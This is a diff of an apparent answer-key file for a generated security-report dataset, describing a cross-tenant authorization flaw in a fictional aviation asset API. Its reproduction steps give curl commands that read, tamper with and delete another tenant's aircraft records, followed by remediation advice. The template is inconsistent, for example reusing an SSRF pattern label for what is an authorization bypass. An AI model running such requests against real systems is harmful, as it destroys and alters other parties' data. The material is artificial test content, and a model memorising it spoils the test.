@@ -1,53 +1,69 @@
 # Expected Response
 
 ## System
-- Domain: Aviation / Flight Ops
-- System: AeroOps Flight Management
+- System: AeroOps Flight Management v1.7.0
+- Domain: AVIATION / FLIGHT OPS
 - Example ID: BOLA-0087
+- Risk ID: RISK-53-087
 
-## Priority Findings
+## Findings
 
-### Finding 1: SSRF via user-controlled URLs (Pattern 5.3)
-**Severity:** Critical
-**Category:** Injection
+### 1. Pattern 5.3 — User-Controlled URL Path Parameter Bypasses Authorization: Cross-Tenant Flight Asset DELETE on `/api/v3/assets/:id` (HAR Primary)
 
-**Summary:**
-The `/api/v1/resources` endpoint is vulnerable to Pattern 5.3 (SSRF via user-controlled URLs).
-An authenticated user from `ORG-0E38` can access or modify objects owned by `ORG-3337`
-by manipulating the resource identifier in the request.
+The `GET/PATCH/DELETE /api/v3/assets/:id` endpoint uses the user-controlled URL path `asset_id` as the sole lookup key. The backend resolves whichever asset ID the caller provides — no ownership or tenant check is applied. An attacker substitutes a cross-tenant `asset_id` in the URL to access, corrupt, or destroy another airline's flight operations assets (aircraft registry, maintenance plans, fleet records).
 
-**Evidence from artifact:**
-- Request JWT `tenantId`: `ORG-0E38`
-- Response body `tenantId`: `ORG-3337` — confirms cross-tenant data returned
-- HTTP status: 200 — no authorization failure
-- `sensitiveData` field exposed across tenant boundary
+**Evidence from HAR:**
+- Request: `DELETE /api/v3/assets/ASS-2087` from `ORG-0E38` (`X-Tenant-ID: ORG-0E38`)
+- Response `tenantId: "ORG-3337"` — cross-tenant aviation asset deletion confirmed
+- HTTP status: 200 — no authorization check triggered
+- Response returns deleted asset's `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-3337"`
 
-**Root Cause:**
-Database query does not include `WHERE owner_id = $authenticatedUserId AND tenant_id = $jwtTenantId`.
-The application trusts the path parameter alone.
+In Aviation, asset deletion without authorization could remove active aircraft from the flight management system — an FAA/EASA safety-critical data integrity violation.
 
-## Steps to Reproduce
+## Reproduction
 
-### Step 1 — Authorize baseline
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.aeroops-flight-.example.com/api/v1/resources/RES-1087" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>"
+curl -s "https://api.aeroops-flight-.example.com/api/v3/assets/ASS-1087" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>" \
+  -H "X-Tenant-ID: ORG-0E38"
 ```
-Expected: Returns own record with `tenantId: "ORG-0E38"`.
+**Expected:** Returns own aviation asset with `tenantId: "ORG-0E38"`.
 
-### Step 2 — ID substitution
+**Step 2 — Cross-tenant aviation asset DELETE: user-controlled URL (primary HAR attack):**
 ```bash
-curl -s "https://api.aeroops-flight-.example.com/api/v1/resources/RES-2087" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>"
+curl -s -X DELETE "https://api.aeroops-flight-.example.com/api/v3/assets/ASS-2087" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>" \
+  -H "X-Tenant-ID: ORG-0E38"
 ```
-**Vulnerable:** Returns `tenantId: "ORG-3337"` and `sensitiveData`.
-**Secure:** HTTP 403 or 404.
+**Vulnerable outcome:** Returns `tenantId: "ORG-3337"` — another airline's flight operations asset deleted.
 
-### Step 3 — Variant tests based on Pattern 5.3
-No specific variant documented for Pattern 5.3 — use Steps 1-2.
+**Step 3 — PATCH: tamper with cross-tenant flight asset data:**
+```bash
+curl -s -X PATCH "https://api.aeroops-flight-.example.com/api/v3/assets/ASS-2087" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>" \
+  -H "X-Tenant-ID: ORG-0E38" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "grounded", "sensitive_data": "flight_asset_tampered_by_competitor"}'
+```
+**Vulnerable outcome:** Competitor's aircraft status set to `grounded` — flight operations disruption, potential safety/regulatory impact.
+
+**Step 4 — GET: read cross-tenant aviation intelligence:**
+```bash
+curl -s "https://api.aeroops-flight-.example.com/api/v3/assets/ASS-2087" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>" \
+  -H "X-Tenant-ID: ORG-0E38"
+```
+**Vulnerable outcome:** Returns competitor airline's fleet/maintenance records — aviation competitive intelligence.
+
+## Secure Outcome
+```json
+{ "error": "Forbidden", "code": 403 }
+```
 
 ## Remediation
-1. Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub` to all queries that accept user-supplied IDs.
-2. Centralise authorization middleware: never allow ID resolution without ownership check.
-3. Use non-sequential, randomly-generated UUIDs for object IDs to reduce enumeration risk.
-4. Add regression test: Tenant A token requests Tenant B ID — assert 403/404.
+- Add `WHERE asset_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all asset queries (RISK-53-087).
+- Validate ownership before any write operation (PATCH, DELETE) on aviation assets.
+- Centralize authorization middleware: never resolve asset IDs from URL without tenant check.
+- Use non-sequential UUIDs for asset IDs to reduce enumeration risk.
+- FAA/EASA audit log: record all modifications to flight management assets.
